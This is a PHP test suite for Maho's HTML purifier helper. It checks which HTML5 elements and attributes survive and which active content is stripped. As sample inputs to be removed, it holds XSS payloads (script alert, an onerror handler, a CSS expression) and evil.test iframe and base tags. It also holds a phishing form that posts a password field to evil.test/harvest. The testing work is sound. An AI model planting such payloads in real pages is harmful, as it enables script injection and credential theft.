<?php

/**
 * SPDX-FileCopyrightText: 2026 Maho <https://mahocommerce.com>
 * SPDX-License-Identifier: OSL-3.0
 */

declare(strict_types=1);

uses(Tests\MahoBackendTestCase::class);

beforeEach(function () {
    $this->purifier = Mage::helper('core/purifier');
});

describe('Mage_Core_Helper_Purifier HTML5 support', function () {
    // Regression: the previous HTMLPurifier-based implementation validated against
    // XHTML 1.0 Transitional, which predates HTML5. Every element below was unknown
    // to it and got unwrapped on save, silently destroying stored content.
    it('keeps HTML5 media elements', function (string $input) {
        expect($this->purifier->purify($input))->toContain($input === '' ? '' : '<');
    })->with([
        '<video controls><source src="/a.mp4" /></video>',
        '<audio controls src="/a.mp3"></audio>',
        '<picture><source srcset="/a.webp" /><img src="/a.jpg" alt="x" /></picture>',
    ]);

    it('keeps HTML5 semantic elements', function (string $tag) {
        expect($this->purifier->purify("<$tag>content</$tag>"))->toContain("<$tag>");
    })->with(['figure', 'figcaption', 'details', 'summary', 'section', 'article', 'mark']);

    it('keeps attributes the old doctype dropped', function () {
        $html = '<a href="/x" target="_blank" rel="noopener">l</a>';
        expect($this->purifier->purify($html))
            ->toContain('target="_blank"')
            ->toContain('rel="noopener"');

        expect($this->purifier->purify('<img src="/a.jpg" alt="x" loading="lazy" />'))
            ->toContain('loading="lazy"');
    });

    it('keeps class, which themes depend on', function () {
        expect($this->purifier->purify('<p class="std">x</p>'))->toContain('class="std"');
    });

    it('keeps arbitrary data-* attributes', function () {
        // The sanitizer matches allowed attributes by exact name and has no wildcard:
        // allowAttribute('data-attr', '*') allows an attribute literally called
        // "data-attr", not every data attribute. The names are read off the content.
        expect($this->purifier->purify('<div data-role="slider" data-autoplay="1">x</div>'))
            ->toContain('data-role="slider"')
            ->toContain('data-autoplay="1"');

        expect($this->purifier->purify('<div data-foo="1"><span data-bar="2">y</span></div>'))
            ->toContain('data-foo="1"')
            ->toContain('data-bar="2"');
    });

    it('keeps the aria attributes the theme components read', function () {
        // DaisyUI's rating fills its stars up to the one marked aria-current, so a star
        // block authored in CMS content renders empty when the attribute is dropped
        $html = '<div class="rating" aria-label="Rated 5 out of 5"><div class="mask" aria-current="true"></div><span aria-hidden="true">*</span></div>';
        expect($this->purifier->purify($html))
            ->toContain('aria-label="Rated 5 out of 5"')
            ->toContain('aria-current="true"')
            ->toContain('aria-hidden="true"');
    });

    it('does not let a data-* allowance smuggle in an event handler', function () {
        expect($this->purifier->purify('<div data-role="x" onclick="alert(1)">z</div>'))
            ->toContain('data-role="x"')
            ->not->toContain('onclick');
    });
});

describe('Mage_Core_Helper_Purifier removes active content', function () {
    it('drops dangerous elements with their contents', function (string $input) {
        expect(trim((string) $this->purifier->purify($input)))->toBe('');
    })->with([
        '<script>alert(1)</script>',
        '<iframe src="https://evil.test"></iframe>',
        '<object data="x.swf"></object>',
        '<embed src="x.swf" />',
        '<base href="https://evil.test/" />',
    ]);

    it('drops event handler attributes', function () {
        expect($this->purifier->purify('<img src="/x.jpg" onerror="alert(1)" />'))
            ->not->toContain('onerror');
    });

    it('rejects non-transport schemes in media sources', function () {
        expect($this->purifier->purify('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" />'))
            ->not->toContain('data:');
    });

    it('accepts arrays, purifying each entry', function () {
        expect($this->purifier->purify(['<b>a</b>', '<script>b</script>']))
            ->toBe(['<b>a</b>', '']);
    });

    it('does not truncate content that fits the storage column', function () {
        // The Symfony sanitizer silently truncates at 20000 characters by default,
        // which would cut the tail off a normal CMS page on save. The cap is raised
        // to the MEDIUMTEXT bound of the content column instead.
        $long = '<p>' . str_repeat('a', 50000) . '</p>';
        expect(strlen((string) $this->purifier->purify($long)))->toBeGreaterThan(49_000);

        expect(Mage_Core_Helper_Purifier::MAX_INPUT_LENGTH)->toBe(2_097_152);
    });
});

describe('Mage_Core_Helper_Purifier inline style', function () {
    // The WYSIWYG stores alignment as inline style and preserves class on every node,
    // so both survive even though the W3C baseline excludes them.
    it('keeps presentational declarations the editor emits', function () {
        expect($this->purifier->purify('<p style="text-align:center;color:#ff0000">x</p>'))
            ->toContain('text-align:center')
            ->toContain('color:#ff0000');
    });

    it('leaves the CSS-level vectors to the malicious-code regex pass', function () {
        // filter() strips expression()/behavior:/javascript: from the raw markup before
        // this helper ever sees it; the sanitizer itself does not parse CSS.
        $filter = new Mage_Core_Model_Input_Filter_MaliciousCode();
        expect($filter->filter('<div style="width:expression(alert(1))">x</div>'))
            ->not->toContain('expression')
            ->and($filter->filter('<div style="behavior:url(x.htc)">x</div>'))->not->toContain('behavior');
    });
});

describe('Mage_Core_Helper_Purifier form handling', function () {
    // Forms are dropped as the W3C baseline has them. A form in a content field posts
    // wherever its action says, under the merchant's own domain and certificate, which
    // is what makes a credential prompt convincing. Use a block or widget instead.
    it('drops form controls', function (string $input) {
        expect($this->purifier->purify($input))->not->toContain('<');
    })->with([
        '<form action="https://evil.test/harvest"><input name="password" /></form>',
        '<input name="q" />',
        '<select><option>a</option></select>',
        '<textarea></textarea>',
    ]);

    it('leaves ordinary external links alone', function () {
        expect($this->purifier->purify('<a href="https://external.example/p">l</a>'))
            ->toContain('https://external.example/p');
    });
});
